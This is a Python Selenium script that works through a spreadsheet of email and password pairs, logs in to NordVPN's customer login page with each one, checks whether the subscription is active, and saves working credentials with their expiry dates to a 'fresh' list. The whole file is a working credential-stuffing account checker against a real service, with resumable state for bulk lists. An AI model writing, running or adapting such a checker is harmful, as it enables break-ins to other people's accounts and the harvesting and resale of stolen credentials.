from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import pandas as pd
import os

damaskus = 4

def Login(dr,email,password):
    driver.get('https://ucp.nordvpn.com/login/')
    time.sleep(damaskus)

    d = dr.find_element_by_id("ucp_login_email_field")
    d.send_keys(Keys.CONTROL + "a")
    d.send_keys(Keys.DELETE)
    d.send_keys(email)
    d = dr.find_element_by_id("ucp_login_password_field")
    d.send_keys(Keys.CONTROL + "a")
    d.send_keys(Keys.DELETE)
    d.send_keys(password)
    
    dr.find_element_by_css_selector('#app > div > div.bg-bw-2.PageLayout__content > div > div > div > form > div > button').click()
    time.sleep(damaskus*2)
    try:
        dr.find_element_by_class_name("Alert__text")
        return False
    except Exception:
        return True

def Logout(dr):
    try:
        dr.find_element_by_css_selector(".Link.Logout").click()
        time.sleep(damaskus*2)
        return True
    except Exception:
        return False

def Check(dr):
    tos = dr.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/div/div/section/div/div/div[1]/div/div[1]/span[2]/span').text
    if tos.lower()=="active":
        try:
            dos = dr.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/div/div/section/div/div/div[1]/div/div[1]/p').text.split('·')[1].split("on")[1].strip()
        except  Exception:
            dos = dr.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/div/div/section/div/div/div[1]/div/div[1]/p').text
        return (tos,dos)
    else:
        return (tos,"")


data = pd.read_excel(input("Enter the path of accountlist.xlsx"))
state_file = "state.txt"
fresh_account_file = "freshlist.txt"

def change_state(sf,n):
    with open(sf,"w") as f:
        f.write(str(n))
def get_state(sf):
    with open(sf,"r") as f:
        return int(f.readline())

def add_data(sf,email,password,expiration_date):
    with open(sf,"a") as f:
        f.writelines(f'{email},{password},{expiration_date.replace(",",":")}\n')


if not os.path.exists(state_file):
    change_state(state_file,0)

if not os.path.exists(fresh_account_file):
    add_data(fresh_account_file,"Email","Password","Expire")

driver = webdriver.Chrome()
state = get_state(state_file)

while state<=data.Email.count():

    email = data.iloc[state].Email
    pwd = data.iloc[state].Password

    print(f'Email:{email} Password:{pwd}')

    flag = Login(driver,email,pwd)

    if flag:
        print(f'Login success: {email}')
        (active,expire) = Check(driver)
        if active.lower() == "active":
            print('Active')
            add_data(fresh_account_file,email,pwd,expire)
        else:
            print('Not active!')
        
        print("Logout!")
        Logout(driver)

    else:
        print(f'Failed to login... Email: {email} password:{pwd}')
        driver.get('https://ucp.nordvpn.com/login/')
        time.sleep(damaskus)
    state += 1
    change_state(state_file,state)
